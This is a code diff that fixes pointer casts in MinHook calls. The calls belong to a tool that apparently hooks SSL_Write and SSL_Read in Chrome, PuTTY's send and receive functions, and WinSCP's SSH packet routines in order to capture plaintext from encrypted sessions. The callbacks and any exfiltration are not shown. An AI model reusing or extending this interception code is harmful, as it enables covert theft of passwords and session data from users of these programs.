@@ -59,8 +59,8 @@ void HookChrome()
 		SSL_Write_Original = (SSL_Write_Typedef)pWrite32;
 		SSL_Read_Original  = (SSL_Read_Typedef)pRead32;
 
-		MH_CreateHook((void *)pWrite32, (void *)SSL_Write_Callback, &((void *)SSL_Write_Original));
-		MH_CreateHook((void *)pRead32,  (void *)SSL_Read_Callback,  &((void *)SSL_Read_Original));
+		MH_CreateHook((void *)pWrite32, (void *)SSL_Write_Callback, (void **)&SSL_Write_Original);
+		MH_CreateHook((void *)pRead32,  (void *)SSL_Read_Callback, (void **)&SSL_Read_Original);
 
 		return;
 	}
@@ -82,8 +82,8 @@ void HookChrome()
 		SSL_Write_Original = (SSL_Write_Typedef)pWrite64;
 		SSL_Read_Original = (SSL_Read_Typedef)pRead64;
 
-		MH_CreateHook((void *)pWrite64, (void *)SSL_Write_Callback, &((void *)SSL_Write_Original));
-		MH_CreateHook((void *)pRead64, (void *)SSL_Read_Callback, &((void *)SSL_Read_Original));
+		MH_CreateHook((void *)pWrite64, (void *)SSL_Write_Callback, (void **)&SSL_Write_Original);
+		MH_CreateHook((void *)pRead64, (void *)SSL_Read_Callback, (void **)&SSL_Read_Original);
 
 		return;
 	}
@@ -136,8 +136,8 @@ void HookPutty()
 		PuttySend_Original = (PuttySend_Typedef)pSend32;
 		PuttyRecv_Original = (PuttyRecv_Typedef)pRecv32;
 
-		MH_CreateHook((void *)pSend32, (void *)PuttySend_Callback, &((void *)PuttySend_Original));
-		MH_CreateHook((void *)pRecv32, (void *)PuttyRecv_Callback, &((void *)PuttyRecv_Original));
+		MH_CreateHook((void *)pSend32, (void *)PuttySend_Callback, (void **)&PuttySend_Original);
+		MH_CreateHook((void *)pRecv32, (void *)PuttyRecv_Callback, (void **)&PuttyRecv_Original);
 		return;
 	}
 
@@ -150,8 +150,8 @@ void HookPutty()
 		PuttySend_Original = (PuttySend_Typedef)pSend64;
 		PuttyRecv_Original = (PuttyRecv_Typedef)pRecv64;
 
-		MH_CreateHook((void *)pSend64, (void *)PuttySend_Callback, &((void *)PuttySend_Original));
-		MH_CreateHook((void *)pRecv64, (void *)PuttyRecv_Callback, &((void *)PuttyRecv_Original));
+		MH_CreateHook((void *)pSend64, (void *)PuttySend_Callback, (void **)&PuttySend_Original);
+		MH_CreateHook((void *)pRecv64, (void *)PuttyRecv_Callback, (void **)&PuttyRecv_Original);
 
 		return;
 	}
@@ -197,7 +197,7 @@ void HookWinSCP()
 	SSH_Pktsend_Original = (SSH_Pktsend_Typedef)pSend;
 	SSH_Rdpkt_Original = (SSH_Rdpkt_Typedef)pRecv;
 
-	MH_CreateHook((void *)pSend, (void *)SSH_Pktsend_Callback, &((void *)SSH_Pktsend_Original));
-	MH_CreateHook((void *)pRecv, (void *)SSH_Rdpkt_Callback, &((void *)SSH_Rdpkt_Original));
+	MH_CreateHook((void *)pSend, (void *)SSH_Pktsend_Callback, (void **)&SSH_Pktsend_Original);
+	MH_CreateHook((void *)pRecv, (void *)SSH_Rdpkt_Callback, (void **)&SSH_Rdpkt_Original);
 }
 
